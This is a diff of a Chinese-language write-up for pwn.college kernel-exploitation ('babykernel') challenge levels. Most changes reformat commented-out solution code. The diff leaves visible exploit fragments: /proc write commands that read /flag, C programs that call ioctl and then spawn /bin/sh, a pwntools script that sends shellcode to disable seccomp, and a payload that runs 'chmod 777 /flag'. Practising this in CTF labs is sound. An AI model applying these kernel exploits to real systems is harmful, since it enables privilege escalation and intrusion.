@@ -34,19 +34,20 @@ echo ccvqignnvespgtyp > /proc/pwncollege | dmesg
 
 # level3.0
 write写"xpmylzhkfevejscw"
-<!-- ```Shell
-echo xpmylzhkfevejscw > /proc/pwncollege | cat /flag
-``` -->
+
+<!-- echo xpmylzhkfevejscw > /proc/pwncollege | cat /flag -->
+
 
 # level3.1
 同 level3.0
-<!-- ```Shell
+
+<!--
 echo gwcifabytyzfdpjo > /proc/pwncollege | cat /flag
-``` -->
+-->
 
 # level4.0
 ioctl传递"emrbpgldsrexybrh"
-<!-- ```C
+<!-- 
 #include <stdio.h>
 #include <fcntl.h>
 
@@ -56,11 +57,11 @@ int main() {
     system("/bin/sh");
     return 0;
 }
-``` -->
+-->
 
 # level4.1
 同 level4.0
-<!-- ```C
+<!-- 
 #include <stdio.h>
 #include <fcntl.h>
 
@@ -70,11 +71,11 @@ int main() {
     system("/bin/sh");
     return 0;
 }
-``` -->
+-->
 
 # level5.0
 ioctl传递后门函数的地址即可
-<!-- ```C
+<!-- 
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
@@ -88,11 +89,11 @@ int main() {
   system("/bin/sh");
   return 0;
 }
-``` -->
+-->
 
 # level5.1
 同 level5.0
-<!-- ```C
+<!-- 
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
@@ -106,11 +107,11 @@ int main() {
   system("/bin/sh");
   return 0;
 }
-``` -->
+-->
 
 # level6.0
 直接传shellcode过去，它会自己执行
-<!-- ```C
+<!-- 
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
@@ -124,12 +125,12 @@ int main() {
   system("/bin/sh");
   return 0;
 }
-``` -->
+-->
 
 # level6.1
 同 level6.0
 
-<!-- ```C
+<!-- 
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
@@ -143,7 +144,7 @@ int main() {
   system("/bin/sh");
   return 0;
 }
-``` -->
+-->
 
 
 # level7.0
@@ -155,8 +156,8 @@ struct buf{
   long call_addr;
 };
 ```
-传入的shellcode会被复杂都内核开辟的一段可执行地址内，该地址固定，将call_addr设置为该地址就可以跳过去执行shellcode
-<!-- ```C
+传入的shellcode会被复制到内核开辟的一段可执行地址内，该地址固定，将call_addr设置为该地址就可以跳过去执行shellcode
+<!-- 
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
@@ -182,11 +183,11 @@ int main() {
   system("/bin/sh");
   return 0;
 }
-``` -->
+-->
 
 # level7.1
 同 level7.0
-<!-- ```C
+<!-- 
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
@@ -212,7 +213,7 @@ int main() {
   system("/bin/sh");
   return 0;
 }
-``` -->
+-->
 
 
 # level8.0
@@ -224,7 +225,7 @@ int main() {
 - 思路就是通过babykernel_level8.1向/proc/challenge写入shellcode在内核空间中关闭seccomp，然后在用户空间ORW读取flag
 - 注意通过current_task_struct->thread_info.flags关闭seccomp只能作用于该进程，通过system('/bin/sh')获取的shell是子进程，seccomp仍然生效
 
-<!-- ```python
+<!-- 
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
@@ -277,12 +278,11 @@ sc+=b'eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xff\xc3\x00'
 io.sendline(sc)
 # io.sendline("cat /flag")
 io.interactive()
-
-``` -->
+-->
 
 # level8.1
 同 level8.0
-<!-- ```python
+<!-- 
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
@@ -335,13 +335,12 @@ sc+=b'eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xff\xc3\x00'
 io.sendline(sc)
 # io.sendline("cat /flag")
 io.interactive()
-
-``` -->
+-->
 
 # level9.0
 
 可以控制第一个参数call任意函数，run_cmd("chmod 777 /flag")
-<!-- ```C
+<!-- 
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
@@ -352,7 +351,7 @@ int main() {
   write(fd,payload,264);
   return 0;
 }
-``` -->
+-->
 # level9.1
 
 同 level9.0
